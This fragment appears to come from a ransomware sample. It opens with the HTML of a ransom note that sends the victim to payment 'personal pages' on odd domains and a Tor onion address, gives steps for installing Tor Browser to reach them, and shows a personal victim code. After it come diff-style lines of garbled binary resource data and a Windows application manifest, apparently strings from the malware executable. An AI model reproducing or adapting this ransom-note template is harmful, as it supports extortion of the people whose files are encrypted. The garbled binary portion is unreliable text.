href="http://kosdfnure75.op1gifsd05mllk.com/444AA12CB4276DEB"   target="_blank">http://kosdfnure75.op1gifsd05mllk.com/444AA12CB4276DEB</a></b><br><b>2.<a href="http://gfdkotriam.fo4j4wnq51hepa.com/444AA12CB4276DEB"   target="_blank">http://gfdkotriam.fo4j4wnq51hepa.com/444AA12CB4276DEB</a></b><br><b>3.<a href="https://zpr5huq4bgmutfnf.onion.to/444AA12CB4276DEB" target="_blank">https://zpr5huq4bgmutfnf.onion.to/444AA12CB4276DEB</a></b><br></div><br><div class="tb" style="font-size:13px; border-color:#880000;">If for some reasons the addresses are not available, follow these steps: <hr>1. Download and install tor-browser: <a href="http://www.torproject.org/projects/torbrowser.html.en" target="_blank">http://www.torproject.org/projects/torbrowser.html.en</a><br>2. After a successful installation, run the browser and wait for initialization.<br>3. Type in the address bar: <font style="font-weight:bold; color:#009977;">zpr5huq4bgmutfnf.onion/444AA12CB4276DEB</font><br>4. Follow the instructions on the site.</div><br><br><b>IMPORTANT INFORMATION:</b><br><div class="tb" style="width:790px;">Your Personal PAGE: <b><a href="http://kosdfnure75.op1gifsd05mllk.com/444AA12CB4276DEB" target="_blank">http://kosdfnure75.op1gifsd05mllk.com/444AA12CB4276DEB</a></b><br><!------sadfsafasdfasdfsadf -->Your Personal PAGE (using TOR): <font style="font-weight:bold; color:#009977;">zpr5huq4bgmutfnf.onion/444AA12CB4276DEB</font><br>Your personal code (if you open the site (or TOR 's) directly): <font style="font-weight:bold; color:#770000;">444AA12CB4276DEB</font><br></div></div></center></body></html>
+wwwwwwwwwwwwwwwpx
+pxwwwwwwwwwwwwwxpx
+pxDDDDDDDDD@
+pxDDDDDDDDDH
+pxDDDDDDDDDH
+pxDDDDDDDDDDDDDDpx
+pwwwwwwwwwwwwwwwp
+wwwwwwwpx
+pxwwwwwwpxDDD
+pxDDDDDDpx
+pwwwwwwww
+63[4]5mm]5\]m]mm5\mm5555555\\\5\\\5m\55\\5ed:
+cOXY/P.Z0.0.QR00/ZPP0000000/0PPZR.BI@/DE0,
+WkV21TSav^8{
+}>qooggggggg1`_fhsnHK
+{JLp
+Nw~ytMMMMMMUbbrrrrrxxxxxxxxrriUMMMMMMMMMUuzt
+I3')+*+)))*))()*+++,6J!54 CBA
+jYPQTVTSkllZTTXRTUiHceWda/
+_<bm
+}zy|yx~
+{|yvrrwsqpon
+PPPPPPPPPPPPPPPPPKMNNNNNNNNNNOLO
+JHHGGGGGGGGHI
+JEEEEEEEEEEFC
+JEEEEEEEEEEFC
+JEEEEEEEEEEFD
+JEFEEEEEEEEEB
+O%JEEEEEEEEEFFB
+JJIIIIJIIIIJJ
+O(@>=77A779?<8;$O' 
+)O6530./21+*-,4#4PPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPP
+<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
+  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
+    <security>
+      <requestedPrivileges>
+        <requestedExecutionLevel level="asInvoker" uiAccess="false"></requestedExecutionLevel>
+      </requestedPrivileges>
+    </security>
+  </trustInfo>
+</assembly>PAPADD
